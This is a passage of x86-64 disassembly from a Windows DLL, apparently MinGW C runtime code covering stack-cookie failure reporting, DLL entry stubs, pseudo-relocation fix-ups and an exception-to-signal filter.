    6968b212:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    6968b216:	48 8b 05 f3 1e 00 00 	mov    0x1ef3(%rip),%rax        # 0x6968d110
    6968b21d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    6968b221:	ff 15 4d 30 10 00    	call   *0x10304d(%rip)        # 0x6978e274
    6968b227:	48 8d 0d 92 a6 0e 00 	lea    0xea692(%rip),%rcx        # 0x697758c0
    6968b22e:	ff 15 60 30 10 00    	call   *0x103060(%rip)        # 0x6978e294
    6968b234:	ff 15 c2 2f 10 00    	call   *0x102fc2(%rip)        # 0x6978e1fc
    6968b23a:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
    6968b23f:	48 89 c1             	mov    %rax,%rcx
    6968b242:	ff 15 3c 30 10 00    	call   *0x10303c(%rip)        # 0x6978e284
    6968b248:	e8 13 11 00 00       	call   0x6968c360
    6968b24d:	48 8b 45 18          	mov    0x18(%rbp),%rax
    6968b251:	48 89 05 e0 ee 0e 00 	mov    %rax,0xeeee0(%rip)        # 0x6977a138
    6968b258:	48 8d 45 08          	lea    0x8(%rbp),%rax
    6968b25c:	48 89 05 75 ee 0e 00 	mov    %rax,0xeee75(%rip)        # 0x6977a0d8
    6968b263:	e9 7b ff ff ff       	jmp    0x6968b1e3
    6968b268:	90                   	nop
    6968b269:	90                   	nop
    6968b26a:	90                   	nop
    6968b26b:	90                   	nop
    6968b26c:	90                   	nop
    6968b26d:	90                   	nop
    6968b26e:	90                   	nop
    6968b26f:	90                   	nop
    6968b270:	48 83 ec 28          	sub    $0x28,%rsp
    6968b274:	83 fa 03             	cmp    $0x3,%edx
    6968b277:	74 17                	je     0x6968b290
    6968b279:	85 d2                	test   %edx,%edx
    6968b27b:	74 13                	je     0x6968b290
    6968b27d:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b282:	48 83 c4 28          	add    $0x28,%rsp
    6968b286:	c3                   	ret
    6968b287:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    6968b28e:	00 00 
    6968b290:	e8 5b 0b 00 00       	call   0x6968bdf0
    6968b295:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b29a:	48 83 c4 28          	add    $0x28,%rsp
    6968b29e:	c3                   	ret
    6968b29f:	90                   	nop
    6968b2a0:	56                   	push   %rsi
    6968b2a1:	53                   	push   %rbx
    6968b2a2:	48 83 ec 28          	sub    $0x28,%rsp
    6968b2a6:	48 8b 05 b3 a7 0e 00 	mov    0xea7b3(%rip),%rax        # 0x69775a60
    6968b2ad:	83 38 02             	cmpl   $0x2,(%rax)
    6968b2b0:	74 06                	je     0x6968b2b8
    6968b2b2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
    6968b2b8:	83 fa 02             	cmp    $0x2,%edx
    6968b2bb:	74 13                	je     0x6968b2d0
    6968b2bd:	83 fa 01             	cmp    $0x1,%edx
    6968b2c0:	74 40                	je     0x6968b302
    6968b2c2:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b2c7:	48 83 c4 28          	add    $0x28,%rsp
    6968b2cb:	5b                   	pop    %rbx
    6968b2cc:	5e                   	pop    %rsi
    6968b2cd:	c3                   	ret
    6968b2ce:	66 90                	xchg   %ax,%ax
    6968b2d0:	48 8d 1d 79 3d 10 00 	lea    0x103d79(%rip),%rbx        # 0x6978f050
    6968b2d7:	48 8d 35 72 3d 10 00 	lea    0x103d72(%rip),%rsi        # 0x6978f050
    6968b2de:	48 39 de             	cmp    %rbx,%rsi
    6968b2e1:	74 df                	je     0x6968b2c2
    6968b2e3:	48 8b 03             	mov    (%rbx),%rax
    6968b2e6:	48 85 c0             	test   %rax,%rax
    6968b2e9:	74 02                	je     0x6968b2ed
    6968b2eb:	ff d0                	call   *%rax
    6968b2ed:	48 83 c3 08          	add    $0x8,%rbx
    6968b2f1:	48 39 de             	cmp    %rbx,%rsi
    6968b2f4:	75 ed                	jne    0x6968b2e3
    6968b2f6:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b2fb:	48 83 c4 28          	add    $0x28,%rsp
    6968b2ff:	5b                   	pop    %rbx
    6968b300:	5e                   	pop    %rsi
    6968b301:	c3                   	ret
    6968b302:	e8 e9 0a 00 00       	call   0x6968bdf0
    6968b307:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b30c:	48 83 c4 28          	add    $0x28,%rsp
    6968b310:	5b                   	pop    %rbx
    6968b311:	5e                   	pop    %rsi
    6968b312:	c3                   	ret
    6968b313:	0f 1f 00             	nopl   (%rax)
    6968b316:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968b31d:	00 00 00 
    6968b320:	31 c0                	xor    %eax,%eax
    6968b322:	c3                   	ret
    6968b323:	90                   	nop
    6968b324:	90                   	nop
    6968b325:	90                   	nop
    6968b326:	90                   	nop
    6968b327:	90                   	nop
    6968b328:	90                   	nop
    6968b329:	90                   	nop
    6968b32a:	90                   	nop
    6968b32b:	90                   	nop
    6968b32c:	90                   	nop
    6968b32d:	90                   	nop
    6968b32e:	90                   	nop
    6968b32f:	90                   	nop
    6968b330:	48 89 c8             	mov    %rcx,%rax
    6968b333:	c3                   	ret
    6968b334:	66 90                	xchg   %ax,%ax
    6968b336:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968b33d:	00 00 00 
    6968b340:	48 89 c8             	mov    %rcx,%rax
    6968b343:	c3                   	ret
    6968b344:	90                   	nop
    6968b345:	90                   	nop
    6968b346:	90                   	nop
    6968b347:	90                   	nop
    6968b348:	90                   	nop
    6968b349:	90                   	nop
    6968b34a:	90                   	nop
    6968b34b:	90                   	nop
    6968b34c:	90                   	nop
    6968b34d:	90                   	nop
    6968b34e:	90                   	nop
    6968b34f:	90                   	nop
    6968b350:	41 54                	push   %r12
    6968b352:	55                   	push   %rbp
    6968b353:	57                   	push   %rdi
    6968b354:	56                   	push   %rsi
    6968b355:	53                   	push   %rbx
    6968b356:	48 83 ec 50          	sub    $0x50,%rsp
    6968b35a:	48 63 35 83 f2 0e 00 	movslq 0xef283(%rip),%rsi        # 0x6977a5e4
    6968b361:	85 f6                	test   %esi,%esi
    6968b363:	48 89 cb             	mov    %rcx,%rbx
    6968b366:	48 89 d5             	mov    %rdx,%rbp
    6968b369:	4c 89 c7             	mov    %r8,%rdi
    6968b36c:	0f 8e 66 01 00 00    	jle    0x6968b4d8
    6968b372:	48 8b 05 6f f2 0e 00 	mov    0xef26f(%rip),%rax        # 0x6977a5e8
    6968b379:	31 c9                	xor    %ecx,%ecx
    6968b37b:	48 83 c0 18          	add    $0x18,%rax
    6968b37f:	90                   	nop
    6968b380:	48 8b 10             	mov    (%rax),%rdx
    6968b383:	48 39 d3             	cmp    %rdx,%rbx
    6968b386:	72 14                	jb     0x6968b39c
    6968b388:	4c 8b 40 08          	mov    0x8(%rax),%r8
    6968b38c:	45 8b 40 08          	mov    0x8(%r8),%r8d
    6968b390:	4c 01 c2             	add    %r8,%rdx
    6968b393:	48 39 d3             	cmp    %rdx,%rbx
    6968b396:	0f 82 89 00 00 00    	jb     0x6968b425
    6968b39c:	83 c1 01             	add    $0x1,%ecx
    6968b39f:	48 83 c0 28          	add    $0x28,%rax
    6968b3a3:	39 f1                	cmp    %esi,%ecx
    6968b3a5:	75 d9                	jne    0x6968b380
    6968b3a7:	48 89 d9             	mov    %rbx,%rcx
    6968b3aa:	e8 41 0c 00 00       	call   0x6968bff0
    6968b3af:	48 85 c0             	test   %rax,%rax
    6968b3b2:	49 89 c4             	mov    %rax,%r12
    6968b3b5:	0f 84 52 01 00 00    	je     0x6968b50d
    6968b3bb:	48 8b 05 26 f2 0e 00 	mov    0xef226(%rip),%rax        # 0x6977a5e8
    6968b3c2:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
    6968b3c6:	48 c1 e6 03          	shl    $0x3,%rsi
    6968b3ca:	48 01 f0             	add    %rsi,%rax
    6968b3cd:	4c 89 60 20          	mov    %r12,0x20(%rax)
    6968b3d1:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    6968b3d7:	e8 44 0d 00 00       	call   0x6968c120
    6968b3dc:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
    6968b3e1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
    6968b3e6:	41 b8 30 00 00 00    	mov    $0x30,%r8d
    6968b3ec:	48 01 c1             	add    %rax,%rcx
    6968b3ef:	48 8b 05 f2 f1 0e 00 	mov    0xef1f2(%rip),%rax        # 0x6977a5e8
    6968b3f6:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
    6968b3fb:	ff 15 b3 2e 10 00    	call   *0x102eb3(%rip)        # 0x6978e2b4
    6968b401:	48 85 c0             	test   %rax,%rax
    6968b404:	0f 84 e6 00 00 00    	je     0x6968b4f0
    6968b40a:	8b 44 24 44          	mov    0x44(%rsp),%eax
    6968b40e:	8d 50 fc             	lea    -0x4(%rax),%edx
    6968b411:	83 e2 fb             	and    $0xfffffffb,%edx
    6968b414:	74 08                	je     0x6968b41e
    6968b416:	83 e8 40             	sub    $0x40,%eax
    6968b419:	83 e0 bf             	and    $0xffffffbf,%eax
    6968b41c:	75 62                	jne    0x6968b480
    6968b41e:	83 05 bf f1 0e 00 01 	addl   $0x1,0xef1bf(%rip)        # 0x6977a5e4
    6968b425:	83 ff 08             	cmp    $0x8,%edi
    6968b428:	73 29                	jae    0x6968b453
    6968b42a:	40 f6 c7 04          	test   $0x4,%dil
    6968b42e:	0f 85 90 00 00 00    	jne    0x6968b4c4
    6968b434:	85 ff                	test   %edi,%edi
    6968b436:	74 10                	je     0x6968b448
    6968b438:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
    6968b43c:	40 f6 c7 02          	test   $0x2,%dil
    6968b440:	88 03                	mov    %al,(%rbx)
    6968b442:	0f 85 97 00 00 00    	jne    0x6968b4df
    6968b448:	48 83 c4 50          	add    $0x50,%rsp
    6968b44c:	5b                   	pop    %rbx
    6968b44d:	5e                   	pop    %rsi
    6968b44e:	5f                   	pop    %rdi
    6968b44f:	5d                   	pop    %rbp
    6968b450:	41 5c                	pop    %r12
    6968b452:	c3                   	ret
    6968b453:	89 f8                	mov    %edi,%eax
    6968b455:	83 ef 01             	sub    $0x1,%edi
    6968b458:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
    6968b45d:	83 ff 08             	cmp    $0x8,%edi
    6968b460:	48 89 54 03 f8       	mov    %rdx,-0x8(%rbx,%rax,1)
    6968b465:	72 e1                	jb     0x6968b448
    6968b467:	83 e7 f8             	and    $0xfffffff8,%edi
    6968b46a:	31 c0                	xor    %eax,%eax
    6968b46c:	89 c2                	mov    %eax,%edx
    6968b46e:	83 c0 08             	add    $0x8,%eax
    6968b471:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
    6968b476:	39 f8                	cmp    %edi,%eax
    6968b478:	48 89 0c 13          	mov    %rcx,(%rbx,%rdx,1)
    6968b47c:	72 ee                	jb     0x6968b46c
    6968b47e:	eb c8                	jmp    0x6968b448
    6968b480:	48 03 35 61 f1 0e 00 	add    0xef161(%rip),%rsi        # 0x6977a5e8
    6968b487:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    6968b48d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
    6968b492:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6968b497:	49 89 f1             	mov    %rsi,%r9
    6968b49a:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
    6968b49e:	48 89 56 10          	mov    %rdx,0x10(%rsi)
    6968b4a2:	ff 15 04 2e 10 00    	call   *0x102e04(%rip)        # 0x6978e2ac
    6968b4a8:	85 c0                	test   %eax,%eax
    6968b4aa:	0f 85 6e ff ff ff    	jne    0x6968b41e
    6968b4b0:	ff 15 5e 2d 10 00    	call   *0x102d5e(%rip)        # 0x6978e214
    6968b4b6:	48 8d 0d fb a4 0e 00 	lea    0xea4fb(%rip),%rcx        # 0x697759b8
    6968b4bd:	89 c2                	mov    %eax,%edx
    6968b4bf:	e8 8c 11 00 00       	call   0x6968c650
    6968b4c4:	8b 45 00             	mov    0x0(%rbp),%eax
    6968b4c7:	89 ff                	mov    %edi,%edi
    6968b4c9:	89 03                	mov    %eax,(%rbx)
    6968b4cb:	8b 44 3d fc          	mov    -0x4(%rbp,%rdi,1),%eax
    6968b4cf:	89 44 3b fc          	mov    %eax,-0x4(%rbx,%rdi,1)
    6968b4d3:	e9 70 ff ff ff       	jmp    0x6968b448
    6968b4d8:	31 f6                	xor    %esi,%esi
    6968b4da:	e9 c8 fe ff ff       	jmp    0x6968b3a7
    6968b4df:	89 ff                	mov    %edi,%edi
    6968b4e1:	0f b7 44 3d fe       	movzwl -0x2(%rbp,%rdi,1),%eax
    6968b4e6:	66 89 44 3b fe       	mov    %ax,-0x2(%rbx,%rdi,1)
    6968b4eb:	e9 58 ff ff ff       	jmp    0x6968b448
    6968b4f0:	48 8b 05 f1 f0 0e 00 	mov    0xef0f1(%rip),%rax        # 0x6977a5e8
    6968b4f7:	48 8d 0d 82 a4 0e 00 	lea    0xea482(%rip),%rcx        # 0x69775980
    6968b4fe:	41 8b 54 24 08       	mov    0x8(%r12),%edx
    6968b503:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
    6968b508:	e8 43 11 00 00       	call   0x6968c650
    6968b50d:	48 8d 0d 4c a4 0e 00 	lea    0xea44c(%rip),%rcx        # 0x69775960
    6968b514:	48 89 da             	mov    %rbx,%rdx
    6968b517:	e8 34 11 00 00       	call   0x6968c650
    6968b51c:	90                   	nop
    6968b51d:	0f 1f 00             	nopl   (%rax)
    6968b520:	55                   	push   %rbp
    6968b521:	41 57                	push   %r15
    6968b523:	41 56                	push   %r14
    6968b525:	41 55                	push   %r13
    6968b527:	41 54                	push   %r12
    6968b529:	57                   	push   %rdi
    6968b52a:	56                   	push   %rsi
    6968b52b:	53                   	push   %rbx
    6968b52c:	48 83 ec 38          	sub    $0x38,%rsp
    6968b530:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
    6968b537:	00 
    6968b538:	8b 1d a2 f0 0e 00    	mov    0xef0a2(%rip),%ebx        # 0x6977a5e0
    6968b53e:	85 db                	test   %ebx,%ebx
    6968b540:	74 11                	je     0x6968b553
    6968b542:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
    6968b546:	5b                   	pop    %rbx
    6968b547:	5e                   	pop    %rsi
    6968b548:	5f                   	pop    %rdi
    6968b549:	41 5c                	pop    %r12
    6968b54b:	41 5d                	pop    %r13
    6968b54d:	41 5e                	pop    %r14
    6968b54f:	41 5f                	pop    %r15
    6968b551:	5d                   	pop    %rbp
    6968b552:	c3                   	ret
    6968b553:	c7 05 83 f0 0e 00 01 	movl   $0x1,0xef083(%rip)        # 0x6977a5e0
    6968b55a:	00 00 00 
    6968b55d:	e8 0e 0b 00 00       	call   0x6968c070
    6968b562:	48 98                	cltq
    6968b564:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6968b568:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
    6968b56f:	00 
    6968b570:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
    6968b574:	e8 47 0d 00 00       	call   0x6968c2c0
    6968b579:	4c 8b 25 00 a5 0e 00 	mov    0xea500(%rip),%r12        # 0x69775a80
    6968b580:	c7 05 5a f0 0e 00 00 	movl   $0x0,0xef05a(%rip)        # 0x6977a5e4
    6968b587:	00 00 00 
    6968b58a:	48 8b 35 ff a4 0e 00 	mov    0xea4ff(%rip),%rsi        # 0x69775a90
    6968b591:	48 29 c4             	sub    %rax,%rsp
    6968b594:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
    6968b599:	48 89 05 48 f0 0e 00 	mov    %rax,0xef048(%rip)        # 0x6977a5e8
    6968b5a0:	4c 89 e0             	mov    %r12,%rax
    6968b5a3:	48 29 f0             	sub    %rsi,%rax
    6968b5a6:	48 83 f8 07          	cmp    $0x7,%rax
    6968b5aa:	7e 96                	jle    0x6968b542
    6968b5ac:	48 83 f8 0b          	cmp    $0xb,%rax
    6968b5b0:	8b 16                	mov    (%rsi),%edx
    6968b5b2:	0f 8e c8 00 00 00    	jle    0x6968b680
    6968b5b8:	85 d2                	test   %edx,%edx
    6968b5ba:	0f 84 a4 00 00 00    	je     0x6968b664
    6968b5c0:	4c 39 e6             	cmp    %r12,%rsi
    6968b5c3:	0f 83 79 ff ff ff    	jae    0x6968b542
    6968b5c9:	4c 8d 76 08          	lea    0x8(%rsi),%r14
    6968b5cd:	49 83 c4 07          	add    $0x7,%r12
    6968b5d1:	4c 8b 2d d8 a4 0e 00 	mov    0xea4d8(%rip),%r13        # 0x69775ab0
    6968b5d8:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
    6968b5dc:	4d 29 f4             	sub    %r14,%r12
    6968b5df:	49 c1 ec 03          	shr    $0x3,%r12
    6968b5e3:	4e 8d 64 e6 08       	lea    0x8(%rsi,%r12,8),%r12
    6968b5e8:	eb 0a                	jmp    0x6968b5f4
    6968b5ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6968b5f0:	49 83 c6 08          	add    $0x8,%r14
    6968b5f4:	8b 4e 04             	mov    0x4(%rsi),%ecx
    6968b5f7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    6968b5fd:	48 89 fa             	mov    %rdi,%rdx
    6968b600:	8b 06                	mov    (%rsi),%eax
    6968b602:	4c 89 f6             	mov    %r14,%rsi
    6968b605:	4c 01 e9             	add    %r13,%rcx
    6968b608:	03 01                	add    (%rcx),%eax
    6968b60a:	89 45 a8             	mov    %eax,-0x58(%rbp)
    6968b60d:	e8 3e fd ff ff       	call   0x6968b350
    6968b612:	4d 39 e6             	cmp    %r12,%r14
    6968b615:	75 d9                	jne    0x6968b5f0
    6968b617:	8b 05 c7 ef 0e 00    	mov    0xeefc7(%rip),%eax        # 0x6977a5e4
    6968b61d:	31 f6                	xor    %esi,%esi
    6968b61f:	4c 8b 25 86 2c 10 00 	mov    0x102c86(%rip),%r12        # 0x6978e2ac
    6968b626:	85 c0                	test   %eax,%eax
    6968b628:	0f 8e 14 ff ff ff    	jle    0x6968b542
    6968b62e:	66 90                	xchg   %ax,%ax
    6968b630:	48 8b 05 b1 ef 0e 00 	mov    0xeefb1(%rip),%rax        # 0x6977a5e8
    6968b637:	48 01 f0             	add    %rsi,%rax
    6968b63a:	44 8b 00             	mov    (%rax),%r8d
    6968b63d:	45 85 c0             	test   %r8d,%r8d
    6968b640:	74 0e                	je     0x6968b650
    6968b642:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6968b646:	49 89 f9             	mov    %rdi,%r9
    6968b649:	48 8b 48 08          	mov    0x8(%rax),%rcx
    6968b64d:	41 ff d4             	call   *%r12
    6968b650:	83 c3 01             	add    $0x1,%ebx
    6968b653:	48 83 c6 28          	add    $0x28,%rsi
    6968b657:	3b 1d 87 ef 0e 00    	cmp    0xeef87(%rip),%ebx        # 0x6977a5e4
    6968b65d:	7c d1                	jl     0x6968b630
    6968b65f:	e9 de fe ff ff       	jmp    0x6968b542
    6968b664:	8b 4e 04             	mov    0x4(%rsi),%ecx
    6968b667:	85 c9                	test   %ecx,%ecx
    6968b669:	0f 85 51 ff ff ff    	jne    0x6968b5c0
    6968b66f:	8b 56 08             	mov    0x8(%rsi),%edx
    6968b672:	85 d2                	test   %edx,%edx
    6968b674:	75 1d                	jne    0x6968b693
    6968b676:	8b 56 0c             	mov    0xc(%rsi),%edx
    6968b679:	48 83 c6 0c          	add    $0xc,%rsi
    6968b67d:	0f 1f 00             	nopl   (%rax)
    6968b680:	85 d2                	test   %edx,%edx
    6968b682:	0f 85 38 ff ff ff    	jne    0x6968b5c0
    6968b688:	8b 46 04             	mov    0x4(%rsi),%eax
    6968b68b:	85 c0                	test   %eax,%eax
    6968b68d:	0f 85 2d ff ff ff    	jne    0x6968b5c0
    6968b693:	8b 56 08             	mov    0x8(%rsi),%edx
    6968b696:	83 fa 01             	cmp    $0x1,%edx
    6968b699:	0f 85 2f 01 00 00    	jne    0x6968b7ce
    6968b69f:	4c 8b 2d 0a a4 0e 00 	mov    0xea40a(%rip),%r13        # 0x69775ab0
    6968b6a6:	48 83 c6 0c          	add    $0xc,%rsi
    6968b6aa:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
    6968b6b1:	ff ff ff 
    6968b6b4:	4c 8d 75 a8          	lea    -0x58(%rbp),%r14
    6968b6b8:	4c 39 e6             	cmp    %r12,%rsi
    6968b6bb:	72 48                	jb     0x6968b705
    6968b6bd:	e9 80 fe ff ff       	jmp    0x6968b542
    6968b6c2:	0f 86 b8 00 00 00    	jbe    0x6968b780
    6968b6c8:	83 fa 20             	cmp    $0x20,%edx
    6968b6cb:	0f 84 7f 00 00 00    	je     0x6968b750
    6968b6d1:	83 fa 40             	cmp    $0x40,%edx
    6968b6d4:	0f 85 e0 00 00 00    	jne    0x6968b7ba
    6968b6da:	48 8b 11             	mov    (%rcx),%rdx
    6968b6dd:	41 b8 08 00 00 00    	mov    $0x8,%r8d
    6968b6e3:	4c 89 f7             	mov    %r14,%rdi
    6968b6e6:	48 29 c2             	sub    %rax,%rdx
    6968b6e9:	4c 01 ca             	add    %r9,%rdx
    6968b6ec:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    6968b6f0:	4c 89 f2             	mov    %r14,%rdx
    6968b6f3:	e8 58 fc ff ff       	call   0x6968b350
    6968b6f8:	48 83 c6 0c          	add    $0xc,%rsi
    6968b6fc:	4c 39 e6             	cmp    %r12,%rsi
    6968b6ff:	0f 83 12 ff ff ff    	jae    0x6968b617
    6968b705:	8b 4e 04             	mov    0x4(%rsi),%ecx
    6968b708:	8b 06                	mov    (%rsi),%eax
    6968b70a:	0f b6 56 08          	movzbl 0x8(%rsi),%edx
    6968b70e:	4c 01 e9             	add    %r13,%rcx
    6968b711:	4c 01 e8             	add    %r13,%rax
    6968b714:	83 fa 10             	cmp    $0x10,%edx
    6968b717:	4c 8b 08             	mov    (%rax),%r9
    6968b71a:	75 a6                	jne    0x6968b6c2
    6968b71c:	44 0f b7 01          	movzwl (%rcx),%r8d
    6968b720:	4c 89 f2             	mov    %r14,%rdx
    6968b723:	4c 89 f7             	mov    %r14,%rdi
    6968b726:	4d 89 c2             	mov    %r8,%r10
    6968b729:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
    6968b730:	66 45 85 c0          	test   %r8w,%r8w
    6968b734:	4d 0f 48 c2          	cmovs  %r10,%r8
    6968b738:	49 29 c0             	sub    %rax,%r8
    6968b73b:	4d 01 c8             	add    %r9,%r8
    6968b73e:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
    6968b742:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    6968b748:	e8 03 fc ff ff       	call   0x6968b350
    6968b74d:	eb a9                	jmp    0x6968b6f8
    6968b74f:	90                   	nop
    6968b750:	8b 11                	mov    (%rcx),%edx
    6968b752:	4c 89 f7             	mov    %r14,%rdi
    6968b755:	49 89 d0             	mov    %rdx,%r8
    6968b758:	4c 09 fa             	or     %r15,%rdx
    6968b75b:	45 85 c0             	test   %r8d,%r8d
    6968b75e:	49 0f 49 d0          	cmovns %r8,%rdx
    6968b762:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    6968b768:	48 29 c2             	sub    %rax,%rdx
    6968b76b:	4c 01 ca             	add    %r9,%rdx
    6968b76e:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    6968b772:	4c 89 f2             	mov    %r14,%rdx
    6968b775:	e8 d6 fb ff ff       	call   0x6968b350
    6968b77a:	e9 79 ff ff ff       	jmp    0x6968b6f8
    6968b77f:	90                   	nop
    6968b780:	83 fa 08             	cmp    $0x8,%edx
    6968b783:	75 35                	jne    0x6968b7ba
    6968b785:	44 0f b6 01          	movzbl (%rcx),%r8d
    6968b789:	4c 89 f2             	mov    %r14,%rdx
    6968b78c:	4c 89 f7             	mov    %r14,%rdi
    6968b78f:	4d 89 c2             	mov    %r8,%r10
    6968b792:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
    6968b799:	45 84 c0             	test   %r8b,%r8b
    6968b79c:	4d 0f 48 c2          	cmovs  %r10,%r8
    6968b7a0:	49 29 c0             	sub    %rax,%r8
    6968b7a3:	4d 01 c8             	add    %r9,%r8
    6968b7a6:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
    6968b7aa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6968b7b0:	e8 9b fb ff ff       	call   0x6968b350
    6968b7b5:	e9 3e ff ff ff       	jmp    0x6968b6f8
    6968b7ba:	48 8d 0d 57 a2 0e 00 	lea    0xea257(%rip),%rcx        # 0x69775a18
    6968b7c1:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
    6968b7c8:	00 
    6968b7c9:	e8 82 0e 00 00       	call   0x6968c650
    6968b7ce:	48 8d 0d 0b a2 0e 00 	lea    0xea20b(%rip),%rcx        # 0x697759e0
    6968b7d5:	e8 76 0e 00 00       	call   0x6968c650
    6968b7da:	90                   	nop
    6968b7db:	90                   	nop
    6968b7dc:	90                   	nop
    6968b7dd:	90                   	nop
    6968b7de:	90                   	nop
    6968b7df:	90                   	nop
    6968b7e0:	48 83 ec 28          	sub    $0x28,%rsp
    6968b7e4:	8b 01                	mov    (%rcx),%eax
    6968b7e6:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
    6968b7eb:	77 63                	ja     0x6968b850
    6968b7ed:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
    6968b7f2:	73 7b                	jae    0x6968b86f
    6968b7f4:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
    6968b7f9:	0f 84 05 01 00 00    	je     0x6968b904
    6968b7ff:	0f 87 cb 00 00 00    	ja     0x6968b8d0
    6968b805:	3d 02 00 00 80       	cmp    $0x80000002,%eax
    6968b80a:	0f 84 f4 00 00 00    	je     0x6968b904
    6968b810:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
    6968b815:	0f 85 c3 00 00 00    	jne    0x6968b8de
    6968b81b:	31 d2                	xor    %edx,%edx
    6968b81d:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6968b822:	e8 11 0b 00 00       	call   0x6968c338
    6968b827:	48 83 f8 01          	cmp    $0x1,%rax
    6968b82b:	0f 84 2f 01 00 00    	je     0x6968b960
    6968b831:	48 85 c0             	test   %rax,%rax
    6968b834:	0f 84 3c 01 00 00    	je     0x6968b976
    6968b83a:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6968b83f:	ff d0                	call   *%rax
    6968b841:	31 c0                	xor    %eax,%eax
    6968b843:	48 83 c4 28          	add    $0x28,%rsp
    6968b847:	c3                   	ret
    6968b848:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968b84f:	00 
    6968b850:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
    6968b855:	0f 84 b5 00 00 00    	je     0x6968b910
    6968b85b:	77 37                	ja     0x6968b894
    6968b85d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
    6968b862:	0f 84 9c 00 00 00    	je     0x6968b904
    6968b868:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
    6968b86d:	75 6f                	jne    0x6968b8de
    6968b86f:	31 d2                	xor    %edx,%edx
    6968b871:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968b876:	e8 bd 0a 00 00       	call   0x6968c338
    6968b87b:	48 83 f8 01          	cmp    $0x1,%rax
    6968b87f:	74 6f                	je     0x6968b8f0
    6968b881:	48 85 c0             	test   %rax,%rax
    6968b884:	74 58                	je     0x6968b8de
    6968b886:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968b88b:	ff d0                	call   *%rax
    6968b88d:	31 c0                	xor    %eax,%eax
    6968b88f:	48 83 c4 28          	add    $0x28,%rsp
    6968b893:	c3                   	ret
    6968b894:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
    6968b899:	74 69                	je     0x6968b904
    6968b89b:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
    6968b8a0:	75 3c                	jne    0x6968b8de
    6968b8a2:	31 d2                	xor    %edx,%edx
    6968b8a4:	b9 04 00 00 00       	mov    $0x4,%ecx
    6968b8a9:	e8 8a 0a 00 00       	call   0x6968c338
    6968b8ae:	48 83 f8 01          	cmp    $0x1,%rax
    6968b8b2:	0f 84 88 00 00 00    	je     0x6968b940
    6968b8b8:	48 85 c0             	test   %rax,%rax
    6968b8bb:	0f 84 b5 00 00 00    	je     0x6968b976
    6968b8c1:	b9 04 00 00 00       	mov    $0x4,%ecx
    6968b8c6:	ff d0                	call   *%rax
    6968b8c8:	31 c0                	xor    %eax,%eax
    6968b8ca:	48 83 c4 28          	add    $0x28,%rsp
    6968b8ce:	c3                   	ret
    6968b8cf:	90                   	nop
    6968b8d0:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
    6968b8d5:	74 cb                	je     0x6968b8a2
    6968b8d7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
    6968b8dc:	74 26                	je     0x6968b904
    6968b8de:	b8 01 00 00 00       	mov    $0x1,%eax
    6968b8e3:	48 83 c4 28          	add    $0x28,%rsp
    6968b8e7:	c3                   	ret
    6968b8e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968b8ef:	00 
    6968b8f0:	ba 01 00 00 00       	mov    $0x1,%edx
    6968b8f5:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968b8fa:	e8 39 0a 00 00       	call   0x6968c338
